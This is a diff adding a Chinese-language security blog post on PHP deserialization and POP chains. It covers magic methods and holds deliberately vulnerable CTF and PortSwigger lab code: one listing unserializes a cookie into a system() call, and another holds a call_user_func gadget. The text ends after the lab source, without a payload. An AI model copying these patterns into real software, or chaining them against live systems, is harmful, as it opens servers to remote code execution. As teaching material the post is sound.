@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all段考完有空了，來看之前一直想看的POP Chain，順便用這篇筆記紀錄其他關於php序列化的弱點&#x2F;相關知識POP Chain的部分可能還暫時偏基礎但我會盡量寫還要努力🐳   php class在理解序列化&#x2F;反序列化前要先理解class   一個php class的結構大概會是長這樣   12345678910111213141516171819202122">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Serialization Vulns Note">
+<meta property="og:url" content="http://wha13.github.io/2024/04/03/php-serial/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all段考完有空了，來看之前一直想看的POP Chain，順便用這篇筆記紀錄其他關於php序列化的弱點&#x2F;相關知識POP Chain的部分可能還暫時偏基礎但我會盡量寫還要努力🐳   php class在理解序列化&#x2F;反序列化前要先理解class   一個php class的結構大概會是長這樣   12345678910111213141516171819202122">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryt7L1jkA.png">
+<meta property="article:published_time" content="2024-04-04T03:10:04.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="serialization">
+<meta property="article:tag" content="Note">
+<meta property="article:tag" content="POP Chain">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/ryt7L1jkA.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PHP Serialization Vulns Note</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/07/devvortex-htb/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/16/enterprise-thm/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/03/php-serial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/03/php-serial/&text=PHP Serialization Vulns Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/03/php-serial/&is_video=false&description=PHP Serialization Vulns Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP Serialization Vulns Note&body=Check out this article: http://wha13.github.io/2024/04/03/php-serial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/03/php-serial/&name=PHP Serialization Vulns Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/03/php-serial/&t=PHP Serialization Vulns Note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-class"><span class="toc-number">2.</span> <span class="toc-text">php class</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Methods"><span class="toc-number">3.</span> <span class="toc-text">Magic Methods</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">3.2.</span> <span class="toc-text">__get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-number">3.3.</span> <span class="toc-text">__set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">3.4.</span> <span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.6.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.7.</span> <span class="toc-text">__sleep</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Serialization-Unserialization"><span class="toc-number">4.</span> <span class="toc-text">Serialization&#x2F;Unserialization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-Chain"><span class="toc-number">5.</span> <span class="toc-text">POP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-number">6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E5%A0%B4%E5%8A%A0%E6%98%A0"><span class="toc-number">7.</span> <span class="toc-text">同場加映</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpgcc"><span class="toc-number">7.1.</span> <span class="toc-text">phpgcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial"><span class="toc-number">7.2.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">7.3.</span> <span class="toc-text">Ruby</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">8.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PHP Serialization Vulns Note
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-04T03:10:04.000Z" class="dt-published" itemprop="datePublished">2024-04-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Note/" rel="tag">Note</a>, <a class="p-category" href="/tags/POP-Chain/" rel="tag">POP Chain</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/serialization/" rel="tag">serialization</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>段考完有空了，來看之前一直想看的POP Chain，順便用這篇筆記紀錄其他關於php序列化的弱點&#x2F;相關知識<br>POP Chain的部分可能還暫時偏基礎但我會盡量寫<br>還要努力🐳  </p>
+<h2 id="php-class"><a href="#php-class" class="headerlink" title="php class"></a>php class</h2><p>在理解序列化&#x2F;反序列化前要先理解class  </p>
+<p>一個php class的結構大概會是長這樣  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whale</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;Cute_Whale&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$budget</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$food</span> = <span class="string">&#x27;0xf00d&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;python3 cowsay.py &#x27;Welcome back, <span class="subst">$this</span>-&gt;name&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>操作範例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www</span>=<span class="keyword">new</span> <span class="title class_">Whale</span>(<span class="string">&#x27;whale120&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$www</span>-&gt;name);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$www</span>-&gt;food);</span><br></pre></td></tr></table></figure>
+<p>一個變數&#x2F;函數的權限分為<code>public</code>, <code>protected</code>, <code>private</code>，當中代表的分別為外界可採訪，可以繼承但外界不能採訪，以及不能繼承也不能採訪，如果都沒定義那就會被歸類在<code>public</code><br>再來，一個class裡面可以有很多的變數，而這些變數就跟<code>C++</code>裡面的struct呼叫方法很像。<br>如上例，如果我想取得一個Whale物件的名字(<code>name</code>)我只要以<code>variavle_name-&gt;name</code>就可以抓到內容。<br>最後注意到那些<code>__</code>開頭的函數(像是<code>__get</code>, <code>__set</code>)等等，那些是php內建的魔法函數(Magic Methods)，會在一些特定情形被觸發。  </p>
+<h2 id="Magic-Methods"><a href="#Magic-Methods" class="headerlink" title="Magic Methods"></a>Magic Methods</h2><p>一些 magics 的整理：<br>其他遇到的時候google一下都可以owob  </p>
+<h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>這個最好理解，就是在物件被創造時可以初始化它的方法<br>像是剛剛的程式碼：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在初始化的時候就會變成要：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$www</span>=<span class="keyword">new</span> <span class="title class_">Whale</span>(<span class="string">&#x27;whale120&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>要塞個東西進去初始化它的name。  </p>
+<h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>繼續以剛剛的class做例子，假設我沒定義<code>__get</code>函數，那當我抓取是<code>public</code>變數的<code>name</code>時，它一樣可以正常回傳。<br>但假設我今天抓的是<code>protected</code>, <code>private</code>類型的變數，那就會出現error<br><img src="https://hackmd.io/_uploads/ryt7L1jkA.png" alt="image"><br>像這樣。<br>看到這裡，應該就想的到<code>__get</code>函數的功能了吧~<br>沒錯，它就是在抓一個class物件裡面比較隱私的內容時會觸發的函數。<br>那會這樣做的原因是開發員可能會希望一些比較private的物件資訊可以被保護(像是設定<code>__get</code>只能抓身分證前四碼之類的)。<br>最後，如果那個attribute不存在也會先通過<code>__get</code></p>
+<h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>跟<code>__get</code>幾乎一模一樣，在編輯<code>protected</code>, <code>private</code>的attribute內容時會觸發的函數，會有兩個位置，第一個放現在的attribute name, 第二個放變數醬  </p>
+<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>當物件要被當作函數使用時會觸發的magic<br>什麼時候會被當function用呢?<br>像是：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span>=<span class="variable">$Whale</span>-&gt;name;</span><br><span class="line"><span class="variable">$function</span>()</span><br></pre></td></tr></table></figure>
+<p>恩，超怪…  </p>
+<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>當有人試著把物件當作字串解析時會觸發的magic<br>Example:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;url=<span class="keyword">new</span> <span class="title class_">Whale</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;ftp://&#x27;</span>, <span class="variable">$this</span>-&gt;url)</span><br></pre></td></tr></table></figure>
+
+<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在物件收到<code>unserialize()</code>反序列化函數呼叫時會觸發的magic  </p>
+<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><p><code>__wakeup</code>相反，在序列化的時候觸發</p>
+<p>什麼是序列化&#x2F;反序列化?  </p>
+<h2 id="Serialization-Unserialization"><a href="#Serialization-Unserialization" class="headerlink" title="Serialization&#x2F;Unserialization"></a>Serialization&#x2F;Unserialization</h2><p>想想看今天網站想把一個array&#x2F;class 物件當作cookie塞給你怎辦?<br>當然是把它變成一個字串咯，這就是<code>serialize()</code>函數會做的事<br>然後<code>unserialize</code>就是反過來把字串解回去array&#x2F;class 物件  </p>
+<p>看個我之前社內賽的題目：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;confirm&#x27;</span>]!=<span class="string">&quot;Tru34dmin&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;You are not admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;(guest cat)&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;python3 cowsay.py &#x27;Welcome back, <span class="subst">$this</span>-&gt;name&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;cat_&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">0xffff</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;cat_session&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cat</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello, &#x27;</span>.<span class="variable">$cat</span>-&gt;name.<span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;console.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>這題簡單來說就是會塞個序列化後的Cat物件給你當cookie，然後要透過unserialize的過程去觸發<code>__wakeup</code>，最後做command injection<br><del>然後請容我現在不想重打一遍</del>  </p>
+<h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p>終於進到主題了，什麼是pop chain呢?<br>當一個網站會去使用php的unserialize函數去解你丟進去的東西(譬如說cookie)，那如果你能透過串起一些剛剛的magic最後做到你想做的事情，這個產生的payload就叫做POP Chain。<br>直接用Port Swigger上的一題當範例：<br>source code:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$default_desc_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$desc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$product</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$desc_type</span>=<span class="string">&#x27;HTML_DESC&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="keyword">new</span> <span class="title class_">Description</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;default_desc_type = <span class="variable">$desc_type</span>;</span><br><span class="line">        <span class="comment">// Carlos thought this is cool, having a function called in two places... What a genius</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">build_product</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;default_desc_type&quot;</span>, <span class="string">&quot;desc&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">build_product</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">build_product</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;product = <span class="keyword">new</span> <span class="title class_">Product</span>(<span class="variable language_">$this</span>-&gt;default_desc_type, <span class="variable language_">$this</span>-&gt;desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default_desc_type</span>, <span class="variable">$desc</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="variable">$desc</span>-&gt;<span class="variable">$default_desc_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Description</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HTML_DESC</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$TEXT_DESC</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// @Carlos, what were you thinking with these descriptions? Please refactor!</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;HTML_DESC = <span class="string">&#x27;&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TEXT_DESC = <span class="string">&#x27;This product is cool in text&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
